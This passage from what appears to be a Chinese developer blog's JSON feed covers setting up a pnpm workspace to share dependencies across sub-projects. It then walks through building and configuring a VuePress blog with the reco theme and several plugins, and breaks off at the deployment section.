而且会保留子工程中的所依赖的不同版本</p>\n<p>准备一个项目工程, 工程目录结构如下</p>\n<div><pre><code>--- test-project\n  |\n  |- common\n  |\n  |- project1\n  |\n  |- project2\n  |\n  |- project3\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>依据 pnpm 中 <a href=\"https://pnpm.js.org/en/workspaces\" target=\"_blank\" rel=\"noopener noreferrer\">pnpm workspace</a> 这一特性, 需要我们指定哪一个目录是 pnpm 工作区的根目录, 还必须在这个根目录下提供 pnpm-workspace.yaml, 注意.npmrc 文件不是必须的, 如果没有这个文件 pnpm 会按照它默认的配置为我们安装依赖项, 我们需要指定 pnpm 的 stor 目录以及 virtual-store 目录以及其他的一些配置, 所以才创建了这个文件</p>\n<p>这边找到的不采用工作区的缺点, 假设我们的子工程下的同一个依赖项有着不同的版本号, 于是在子工程中执行 pnpm install 的时候, pnpm 会将依赖项安装到指定目录下, 但是两个工程的 virtual-store 目录 是一致的话, 并不能成功的安装多个版本的依赖项（pnpm 为采用最新的版本依赖项, 而将旧版本的依赖项进行删除, 最后导致旧版本的依赖项链接失败）, 而采用了工作区正好可以解决这一个问题, 它会在工作区的根下创建一个锁文件, 这个锁文件包含了工程下的所有依赖项信息, 每一个工程的依赖项信息都是独立的</p>\n<p>我们指定 common 文件夹即是 pnpm 工作区的跟路径, 在这个文件夹里面创建 pnpm-workspace.yaml 和 .npmrc 文件</p>\n<div><pre><code><span>packages</span><span>:</span>\n  <span>-</span> <span>\"../**/\"</span> <span># 允许安装上一级目录下的所有工程的依赖</span>\n  <span>-</span> <span>\"!../**/node_modules/**\"</span> <span># 不允许安装 上一级目录下 node_modules 下的依赖项</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>然后我们还需要对 <code>.npmrc</code> 文件进行一定的配置, 配置如下</p>\n<div><pre><code>link-workspace-packages = true  # 告诉 pnpm 如何去下载工作区的依赖项\nshamefully-hoist = true # 告诉 pnpm 不采用半严格的 node_modules 目录结构\nstore-dir= .pnpm-store # 所有软件包保存在磁盘上的位置\nvirtual-store-dir= node_modules/.pnpm #  项目的所有直接和间接依赖关系都链接到此目录\npackage-import-method= auto # 依赖包从 store 中导入的方式\nregistry = https://registry.npm.taobao.org\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>然后我们在 common 文件目录下执行 pnpm install, 之后我们观察到子工程中的 node_modules 目录的大小实际不到 100kb, common 目录下的 node_modules 也在 300M 到 500M, 其余 i 的依赖项大多数都是链接到 common 文件夹下的 node_modules/.pnpm 这个目录</p>\n<p>但是, 在运行 npm run serve 的时候, 继而发现了一个严峻的问题</p>\n<p>比如在 <code>babel.config.js</code> 中配置了 <code>@babel/preset-env</code> 这一个配置项, 然而在 <code>package.json</code> 中并没有此项依赖, 在该工程的 node_modules 下也没有找到它的链接</p>\n<p>接着尝试在子工程中也创建 <code>.npmrc</code> 这个文件, 文件内容如下</p>\n<div><pre><code>store-dir= ../common/.pnpm-store # 所有软件包保存在磁盘上的位置, 需要指向 common 目录\nvirtual-store-dir= ../common/node_modules/.pnpm #  项目的所有直接和间接依赖关系都链接到此目录, 需要指向 common 目录\npackage-import-method= auto # 依赖包从 store 中导入的方式\nregistry = https://registry.npm.taobao.org\nshamefully-hoist = true # 告诉 pnpm 不采用半严格的 node_modules 目录结构\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>然后再次在子工程中执行 pnpm install, 之后我们观察到子工程中的 node_modules 目录的大小会适当的加大了几百 kb, 因为我们又为子工程安装了一些链接不到的依赖项, 这一操作是为了安装子工程中没有链接到 common 目录下的依赖包, 不过不用担心, 在第一个子工程中执行的时候会比较耗时, 大概在 1~2 分钟, 然后在其他的子工程中再次执行的时候, 几乎不占时间的为子工程创建链接（除非这个依赖项在 common 中找不到）</p>\n<p>这里需要注意的是 common 下面配置的 registry 和子工程下配置的 registry 是需要一致的, 否则 pnpm 为我们安装不同软件源的依赖项, 这一过程是多余的</p>\n",
      "date_published": "2020-08-19T14:14:13.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "nodejs"
      ]
    },
    {
      "title": "使用 vuepress 更新我的博客",
      "url": "https://vxhly.github.io/views/nodejs/vuepress-blog-on-github.html",
      "id": "https://vxhly.github.io/views/nodejs/vuepress-blog-on-github.html",
      "summary": "前言\n嗯～, 没错, 博客又迎来一次重大的更新, 此次更新不再采用 hexo 这个静态博客解决方案, 将采用 vuepress 这一静态博客解决方案。本博文将会从搭建博客到部署上线进行较详细的介绍。\n\n",
      "content_html": "<div><p>前言</p>\n<p>嗯～, 没错, 博客又迎来一次重大的更新, 此次更新不再采用 hexo 这个静态博客解决方案, 将采用 vuepress 这一静态博客解决方案。本博文将会从搭建博客到部署上线进行较详细的介绍。</p>\n</div>\n\n<h2 id=\"开始你的博客\" tabindex=\"-1\"> 开始你的博客</h2>\n<h3 id=\"前期准备\" tabindex=\"-1\"> 前期准备</h3>\n<p><a href=\"https://vuepress.vuejs.org/zh/plugin/\" target=\"_blank\" rel=\"noopener noreferrer\">VuePress 官方文档</a>, 不管怎样这份文档多多少少都得阅读一遍吧</p>\n<p><a href=\"https://vuepress-theme-reco.recoluan.com/\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-theme-reco 博客主题文档</a>, 如果你用的博客主题和我的一样的话, 这份文档也该阅读一遍吧, 如果不是的话或是你找到了更加优秀主题的话请你私信给我</p>\n<h3 id=\"安装博客主题-cli\" tabindex=\"-1\"> 安装博客主题 CLI</h3>\n<div><pre><code><span>npm</span> i -g vuepress <span># 如果可以的话, 建议您 vuepress 可以全局安装一下依赖, 当然不装也没啥大问题</span>\n<span>npm</span> <span>install</span> @vuepress-reco/theme-cli -g\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"创建一份基础的-demo\" tabindex=\"-1\"> 创建一份基础的 DEMO</h3>\n<p>命令行会已一问一答的方式指引你创建一份新的博客, 按照提示进行配置即可</p>\n<div><pre><code>theme-cli init my-blog\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装依赖\" tabindex=\"-1\"> 安装依赖</h3>\n<div><pre><code><span>cd</span> my-blog\n<span>npm</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"预览\" tabindex=\"-1\"> 预览</h3>\n<p>这一步可分为开发模式预览和线上模式预览。 开发模式预览指未发布前自己个儿边写博文边看效果（PS：可自动刷新浏览器）；线上模式预览指准备发布了,打包之后查看线上的效果</p>\n<h4 id=\"开发模式预览\" tabindex=\"-1\"> 开发模式预览</h4>\n<div><pre><code><span>npm</span> dev <span># 打开浏览器即可浏览, 网址: 127.0.0.1:8080</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"线上模式预览\" tabindex=\"-1\"> 线上模式预览</h4>\n<div><pre><code><span>npm</span> build\nserver public <span># 需要提前安装 serve（开启本地的一个服务器, 执行命令 npm i -g serve）</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"新的一篇文章\" tabindex=\"-1\"> 新的一篇文章</h2>\n<div><p>提示</p>\n<p>该博客主题 CLI 没有像 hexo 的 CLI 一样提供创建文章的功能, 所以在此自己就撸了个 CLI 工具, 有需要的向下看</p>\n</div>\n<p>上 GitHub 地址: <a href=\"https://github.com/vxhly/vuepress-article-cli\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-article-cli</a></p>\n<h3 id=\"安装-cli-工具\" tabindex=\"-1\"> 安装 CLI 工具</h3>\n<div><pre><code><span>npm</span> i vuepress-article-cli -g\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"使用\" tabindex=\"-1\"> 使用</h3>\n<p>新建一篇文章</p>\n<div><pre><code>va-cli new\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/nodejs-cli-1.png\" alt=\"nodejs-cli\"></p>\n<p>批量删除文章</p>\n<div><pre><code>va-cli del\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/nodejs-cli-2.png\" alt=\"nodejs-cli\"></p>\n<p>创建模版文件</p>\n<div><pre><code>va-cli tmp\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/nodejs-cli-3.png\" alt=\"nodejs-cli\"></p>\n<h2 id=\"进阶配置\" tabindex=\"-1\"> 进阶配置</h2>\n<p>经过上面的一系列折腾, 就能开始使用 VuePress 这个博客了</p>\n<div><p>提示</p>\n<p>以下只提供 <a href=\"https://vuepress-theme-reco.recoluan.com/\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-theme-reco 博客主题文档</a> 中未提及的配置项</p>\n</div>\n<h3 id=\"last-updated\" tabindex=\"-1\"> last-updated</h3>\n<div><p>注意</p>\n<p>无需重新按照该插件, 直接进入配置即可, 这个插件也可不进行配置, 至于为啥要在本博文中写出（PS： 默认显示的时间格式可读性比较差, 所以需要进行格式化一下）</p>\n</div>\n<p>显示最后的更新时间插件, 先上插件文档 <a href=\"https://vuepress.vuejs.org/zh/plugin/official/plugin-last-updated.html\" target=\"_blank\" rel=\"noopener noreferrer\">@vuepress/last-updated</a></p>\n<p>再上配置, <code>/.vuepress/config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>plugins</span><span>:</span> <span>[</span>\n    <span>[</span>\n      <span>\"@vuepress/last-updated\"</span><span>,</span>\n      <span>{</span>\n        <span>transformer</span><span>:</span> <span>(</span><span>timestamp<span>,</span> lang</span><span>)</span> <span>=></span> <span>{</span>\n          <span>// 不要忘了安装 moment</span>\n          <span>// moment 时间格式化文档戳这里 http://momentjs.cn/</span>\n          <span>const</span> moment <span>=</span> <span>require</span><span>(</span><span>\"moment\"</span><span>)</span><span>;</span>\n          moment<span>.</span><span>locale</span><span>(</span>lang<span>)</span><span>;</span>\n          <span>return</span> <span>moment</span><span>(</span>timestamp<span>)</span><span>.</span><span>fromNow</span><span>(</span><span>)</span><span>;</span>\n        <span>}</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>]</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"medium-zoom\" tabindex=\"-1\"> medium-zoom</h3>\n<div><p>注意</p>\n<p>无需重新按照该插件, 直接进入配置即可</p>\n</div>\n<p>插件大图预览, 先上插件文档 <a href=\"https://vuepress.vuejs.org/zh/plugin/official/plugin-pwa.html\" target=\"_blank\" rel=\"noopener noreferrer\">@vuepress/medium-zoom</a></p>\n<p>再上配置, <code>/.vuepress/config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n    <span>plugins</span><span>:</span> <span>[</span>\n        <span>[</span><span>'@vuepress/medium-zoom'</span><span>:</span> <span>{</span>\n            <span>selector</span><span>:</span> <span>\".page img\"</span><span>,</span>\n            <span>options</span><span>:</span> <span>{</span>\n                <span>margin</span><span>:</span> <span>16</span><span>,</span>\n                <span>background</span><span>:</span> <span>\"#202124de\"</span><span>,</span>\n                <span>scrollOffset</span><span>:</span> <span>0</span>\n            <span>}</span>\n        <span>}</span><span>]</span>\n    <span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"pwa\" tabindex=\"-1\"> pwa</h3>\n<div><p>注意</p>\n<p>你的 VPS 服务器必须支持 HTTPS, 否则 PWA 将会失效, 当然如果你和我一样使用 GitHub 的 pages 服务的话, 就无须担心这一点<br> 必须重新依赖该插件, 否则尽管配置了也不会加载 pwa</p>\n</div>\n<p>插件 PWA（PS：关于 PWA 的知识戳这里 <a href=\"https://lavas.baidu.com/pwa\" target=\"_blank\" rel=\"noopener noreferrer\">PWA</a>）, 先上插件文档 <a href=\"https://vuepress.vuejs.org/zh/plugin/official/plugin-pwa.html\" target=\"_blank\" rel=\"noopener noreferrer\">@vuepress/pwa</a></p>\n<p>按照文档中的步骤来, 第一：在 <code>.vuepress/public</code> 提供 <code>Manifest</code> 和 <code>icons</code></p>\n<p>一份 <code>manifest.json</code> 的例子</p>\n<div><pre><code><span>{</span>\n  <span>\"name\"</span><span>:</span> <span>\"Coding and Fixing\"</span><span>,</span>\n  <span>\"short_name\"</span><span>:</span> <span>\"Coding and Fixing\"</span><span>,</span>\n  <span>\"start_url\"</span><span>:</span> <span>\"./index.html\"</span><span>,</span>\n  <span>\"display\"</span><span>:</span> <span>\"fullscreen\"</span><span>,</span>\n  <span>\"background_color\"</span><span>:</span> <span>\"#000000\"</span><span>,</span>\n  <span>\"theme_color\"</span><span>:</span> <span>\"#22979b\"</span><span>,</span>\n  <span>\"icons\"</span><span>:</span> <span>[</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/android-chrome-192x192.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"192x192\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/android-chrome-512x512.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"512x512\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/apple-touch-icon-60x60.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"60x60\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/apple-touch-icon-76x76.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"76x76\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/apple-touch-icon-120x120.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"120x120\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/apple-touch-icon-152x152.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"152x152\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/apple-touch-icon-180x180.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"180x180\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span><span>,</span>\n    <span>{</span>\n      <span>\"src\"</span><span>:</span> <span>\"./icons/msapplication-icon-144x144.png\"</span><span>,</span>\n      <span>\"sizes\"</span><span>:</span> <span>\"144x144\"</span><span>,</span>\n      <span>\"type\"</span><span>:</span> <span>\"image/png\"</span>\n    <span>}</span>\n  <span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>接下来就是 <code>icons</code> 了, 根据你配置的 <code>manifest.json</code> 进行裁剪图标即可</p>\n<p>第二：在 <code>.vuepress/config.js</code> 中添加配置（PS：该步骤略过, 文档中已经提供了）</p>\n<p>部署之后, 你会神奇的发现在你浏览器地址栏的右边出现了一个 <code>+</code> 号的图标, 小主可点击本博客上的 <code>+</code> 号的图标查看效果</p>\n<h3 id=\"copyright\" tabindex=\"-1\"> copyright</h3>\n<div><p>注意</p>\n<p>必须重新依赖该插件, 否则尽管配置了也不会加载</p>\n</div>\n<p>指定页面复制行为的插件, 先上插件文档 <a href=\"https://vuepress.github.io/zh/plugins/copyright/#vuepress-plugin-copyright\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-plugin-copyright</a></p>\n<p>再上配置, <code>/.vuepress/config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>plugins</span><span>:</span> <span>[</span>\n    <span>[</span>\n      <span>\"copyright\"</span><span>,</span>\n      <span>{</span>\n        <span>// 更多配置项以及配置项说明上 https://github.com/vuepress/vuepress-plugin-copyright 查看</span>\n        <span>noCopy</span><span>:</span> <span>true</span><span>,</span>\n        <span>minLength</span><span>:</span> <span>150</span><span>,</span>\n        <span>disabled</span><span>:</span> <span>false</span><span>,</span>\n        <span>noSelect</span><span>:</span> <span>true</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>]</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"clipboard-copy\" tabindex=\"-1\"> clipboard-copy</h3>\n<div><p>提示</p>\n<p>此插件纯粹是自己为了配合上一个插件自己写的一份一键复制插件, 暂未发布, 下面贴出代码供米娜桑参考（PS：效果米娜桑可以对下面的代码进行一键复制即可看到）</p>\n</div>\n<p><code>clipboard-copy.js</code></p>\n<div><pre><code><span>const</span> <span>{</span> resolve <span>}</span> <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n\nmodule<span>.</span><span>exports</span> <span>=</span> <span>(</span><span>options<span>,</span> context</span><span>)</span> <span>=></span> <span>(</span><span>{</span>\n  <span>define</span><span>:</span> <span>{</span>\n    <span>COPY_SELECTOR</span><span>:</span> options<span>.</span>copy_selector <span>||</span> <span>'div[class*=\"language-\"] pre'</span><span>,</span>\n    <span>COPY_ASIDE</span><span>:</span> options<span>.</span>copy_selector <span>||</span> <span>'div[class*=\"aside-code\"] aside'</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>clientRootMixin</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"clientRootMixin.js\"</span><span>)</span><span>,</span>\n<span>}</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>clientRootMixin.js</code></p>\n<div><pre><code><span>import</span> <span>\"./style.css\"</span><span>;</span>\n\n<span>import</span> <span>{</span> message <span>}</span> <span>from</span> <span>\"ant-design-vue\"</span><span>;</span>\n<span>import</span> <span>\"ant-design-vue/lib/message/style/css\"</span><span>;</span>\nmessage<span>.</span><span>config</span><span>(</span><span>{</span>\n  <span>top</span><span>:</span> <span><span>`</span><span>100px</span><span>`</span></span><span>,</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>export</span> <span>default</span> <span>{</span>\n  <span>data</span><span>(</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>zoom</span><span>:</span> <span>null</span><span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n\n  <span>mounted</span><span>(</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span><span>updateCopy</span><span>(</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n\n  <span>updated</span><span>(</span><span>)</span> <span>{</span>\n    <span>this</span><span>.</span><span>updateCopy</span><span>(</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span>\n\n  <span>methods</span><span>:</span> <span>{</span>\n    <span>updateCopy</span><span>(</span><span>)</span> <span>{</span>\n      <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>\n        document\n          <span>.</span><span>querySelectorAll</span><span>(</span><span>COPY_SELECTOR</span><span>)</span>\n          <span>.</span><span>forEach</span><span>(</span><span>this</span><span>.</span>generateCopyButton<span>)</span><span>;</span>\n        document<span>.</span><span>querySelectorAll</span><span>(</span><span>COPY_ASIDE</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>this</span><span>.</span>generateCopyButton<span>)</span><span>;</span>\n      <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n    <span>generateCopyButton</span><span>:</span> <span>function</span> <span>(</span><span>parent</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span>parent<span>.</span>classList<span>.</span><span>contains</span><span>(</span><span>\"codecopy-enabled\"</span><span>)</span><span>)</span> <span>return</span><span>;</span>\n      <span>const</span> copyElement <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>\"span\"</span><span>)</span><span>;</span>\n      copyElement<span>.</span>className <span>=</span> <span>\"code-copy iconfont reco-api\"</span><span>;</span>\n      copyElement<span>.</span>title <span>=</span> <span>\"Click to Copy to Clipboard\"</span><span>;</span>\n      copyElement<span>.</span><span>addEventListener</span><span>(</span><span>\"click\"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n        <span>this</span><span>.</span><span>copyToClipboard</span><span>(</span>parent<span>.</span>innerText<span>)</span><span>;</span>\n      <span>}</span><span>)</span><span>;</span>\n      parent<span>.</span><span>appendChild</span><span>(</span>copyElement<span>)</span><span>;</span>\n      parent<span>.</span>classList<span>.</span><span>add</span><span>(</span><span>\"codecopy-enabled\"</span><span>)</span><span>;</span>\n    <span>}</span><span>,</span>\n    <span>copyToClipboard</span><span>:</span> <span>function</span> <span>(</span><span>str</span><span>)</span> <span>{</span>\n      <span>const</span> el <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>\"textarea\"</span><span>)</span><span>;</span>\n      el<span>.</span>value <span>=</span> str<span>;</span>\n      el<span>.</span><span>setAttribute</span><span>(</span><span>\"readonly\"</span><span>,</span> <span>\"\"</span><span>)</span><span>;</span>\n      el<span>.</span>style<span>.</span>position <span>=</span> <span>\"absolute\"</span><span>;</span>\n      el<span>.</span>style<span>.</span>left <span>=</span> <span>\"-9999px\"</span><span>;</span>\n      document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>el<span>)</span><span>;</span>\n      <span>const</span> selected <span>=</span>\n        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span>rangeCount <span>></span> <span>0</span>\n          <span>?</span> document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>getRangeAt</span><span>(</span><span>0</span><span>)</span>\n          <span>:</span> <span>false</span><span>;</span>\n      el<span>.</span><span>select</span><span>(</span><span>)</span><span>;</span>\n      document<span>.</span><span>execCommand</span><span>(</span><span>\"copy\"</span><span>)</span><span>;</span>\n      message<span>.</span><span>success</span><span>(</span><span>\"复制成功,快去粘贴使用吧 !!!\"</span><span>)</span><span>;</span>\n      document<span>.</span>body<span>.</span><span>removeChild</span><span>(</span>el<span>)</span><span>;</span>\n      <span>if</span> <span>(</span>selected<span>)</span> <span>{</span>\n        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>removeAllRanges</span><span>(</span><span>)</span><span>;</span>\n        document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>addRange</span><span>(</span>selected<span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>,</span>\n  <span>}</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>style.css</code></p>\n<div><pre><code><span>.code-copy</span> <span>{</span>\n  <span>color</span><span>:</span> #aaa<span>;</span>\n  <span>display</span><span>:</span> inline-block<span>;</span>\n  <span>cursor</span><span>:</span> pointer<span>;</span>\n<span>}</span>\n\n<span>div[class*=\"language-\"] pre .code-copy,\ndiv[class*=\"aside-code\"] aside .code-copy</span> <span>{</span>\n  <span>position</span><span>:</span> absolute<span>;</span>\n  <span>z-index</span><span>:</span> 1000<span>;</span>\n  <span>top</span><span>:</span> 5px<span>;</span>\n  <span>right</span><span>:</span> 40px<span>;</span>\n  <span>opacity</span><span>:</span> 0<span>;</span>\n  <span>font-size</span><span>:</span> 16px<span>;</span>\n<span>}</span>\n\n<span>div[class*=\"language-\"] pre:hover .code-copy,\ndiv[class*=\"aside-code\"] aside:hover .code-copy</span> <span>{</span>\n  <span>opacity</span><span>:</span> 1<span>;</span>\n<span>}</span>\n\n<span>.content pre,\n.content pre[class*=\"language-\"]</span> <span>{</span>\n  <span>overflow-y</span><span>:</span> hidden<span>;</span>\n<span>}</span>\n\n<span>div[class*=\"language-\"] pre,\ndiv[class*=\"language-\"] pre[class*=\"language-\"]</span> <span>{</span>\n  <span>position</span><span>:</span> static <span>!important</span><span>;</span>\n<span>}</span>\n\n<span>div[class~=\"language-text\"]:before</span> <span>{</span>\n  <span>content</span><span>:</span> <span>\"text\"</span><span>;</span>\n<span>}</span>\n\n<span>div[class~=\"language-yml\"]:before</span> <span>{</span>\n  <span>content</span><span>:</span> <span>\"yml\"</span><span>;</span>\n<span>}</span>\n\n<span>div[class*=\"language-\"] pre</span> <span>{</span>\n  <span>user-select</span><span>:</span> text<span>;</span>\n<span>}</span>\n\n<span>p code</span> <span>{</span>\n  <span>user-select</span><span>:</span> all<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"nest\" tabindex=\"-1\"> nest</h3>\n<div><p>提示</p>\n<p>自己个写的对接 <a href=\"https://github.com/hustcc/canvas-nest.js\" target=\"_blank\" rel=\"noopener noreferrer\">canvas-nest.js</a> 的一个插件</p>\n</div>\n<p>页面 canvas-nest 背景插件, 先上插件文档 <a href=\"https://github.com/vxhly/vuepress-plugin-nest\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-plugin-nest</a></p>\n<p>再上配置, <code>/.vuepress/config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>plugins</span><span>:</span> <span>[</span>\n    <span>[</span>\n      <span>\"nest\"</span><span>,</span>\n      <span>{</span>\n        <span>// 更多配置项以及配置项说明上 https://github.com/vxhly/vuepress-plugin-nest 查看</span>\n        <span>color</span><span>:</span> <span>\"255,0,255\"</span><span>,</span>\n        <span>count</span><span>:</span> <span>100</span><span>,</span>\n        <span>opacity</span><span>:</span> <span>0.7</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>]</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"sitemap\" tabindex=\"-1\"> sitemap</h3>\n<div><p>注意</p>\n<p>如果你的网站希望被搜索引擎搜索到的话, 强烈这个插件需要安装</p>\n</div>\n<p>生成站点地图插件, 先上插件文档 <a href=\"https://github.com/ekoeryanto/vuepress-plugin-sitemap\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress-plugin-sitemap</a></p>\n<p>再上配置, <code>/.vuepress/config.js</code></p>\n<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>\n  <span>plugins</span><span>:</span> <span>[</span>\n    <span>[</span>\n      <span>\"sitemap\"</span><span>,</span>\n      <span>{</span>\n        <span>hostname</span><span>:</span> <span>\"\"</span><span>,</span> <span>// 替换成你的 GitHub 地址</span>\n        <span>exclude</span><span>:</span> <span>[</span><span>\"/404.html\"</span><span>]</span><span>,</span>\n        <span>dateFormatter</span><span>:</span> <span>(</span><span>time</span><span>)</span> <span>=></span> <span>{</span>\n          <span>return</span> time<span>;</span>\n        <span>}</span><span>,</span>\n      <span>}</span><span>,</span>\n    <span>]</span><span>,</span>\n  <span>]</span><span>,</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"部署上线\" tabindex=\"-1\"> 部署上线</h2>\n<div><p>提示</p>\n<p>下面提供的是 <code>GitHub Pages</code> + <code>Travis CI</code> 的部署上线方式, 如果你有更简单的或者更好的方式请你一定私信给我<br> 部分未提及的配置或者其他部署方式, 看这里 <a href=\"https://vuepress.vuejs.org/zh/guide/deploy.html\" target=\"_blank\" rel=\"noopener noreferrer\">VuePress 